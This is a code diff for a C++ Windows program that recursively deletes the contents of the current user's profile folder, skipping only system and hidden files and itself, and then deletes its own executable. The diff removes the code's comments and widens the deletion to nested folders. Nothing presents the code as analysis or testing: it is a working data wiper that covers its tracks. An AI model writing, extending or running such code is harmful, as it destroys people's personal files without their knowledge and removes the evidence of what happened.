@@ -1,5 +1,5 @@
 #include <Windows.h>
-#include <Shlobj.h>  // For SHGetFolderPath
+#include <Shlobj.h>
 #include <iostream>
 #include <string>
 #include <filesystem>
@@ -7,20 +7,15 @@
 namespace fs = std::filesystem;
 
 void DeleteFilesAndDirs(const fs::path& path, const fs::path& excludePath) {
-    for (const auto& entry : fs::directory_iterator(path)) {
-        // Skip the file if it's the excluded path
-        if (entry.path() == excludePath) {
-            continue;
-        }
-
-        // Check for system file attribute
+    for (const auto& entry : fs::recursive_directory_iterator(path)) {
+        // Skip the file if it's the excluded path or if it's a system or hidden file
         DWORD attributes = GetFileAttributes(entry.path().c_str());
-        if (attributes & FILE_ATTRIBUTE_SYSTEM) {
-            // Log and skip system files
-            std::wcout << L"Skipping system file or directory: " << entry.path() << std::endl;
+        if (entry.path() == excludePath || attributes & (FILE_ATTRIBUTE_SYSTEM | FILE_ATTRIBUTE_HIDDEN)) {
+            std::wcout << L"Skipping file or directory: " << entry.path() << std::endl;
             continue;
         }
 
+        // Attempt to delete the file or directory
         try {
             fs::remove_all(entry.path());
         }
@@ -31,15 +26,10 @@ void DeleteFilesAndDirs(const fs::path& path, const fs::path& excludePath) {
 }
 
 int main() {
-    // Get the current user profile directory
     wchar_t userProfile[256];
     SHGetFolderPathW(NULL, CSIDL_PROFILE, NULL, 0, userProfile);
-
-    // Get the current executable's path
     wchar_t exePath[MAX_PATH];
     GetModuleFileNameW(NULL, exePath, MAX_PATH);
-
-    // Convert to filesystem path for easier comparison
     fs::path exeFsPath(exePath);
 
     try {
@@ -50,7 +40,6 @@ int main() {
         return 1;
     }
 
-    // Delete the executable itself
     try {
         fs::remove(exeFsPath);
     }
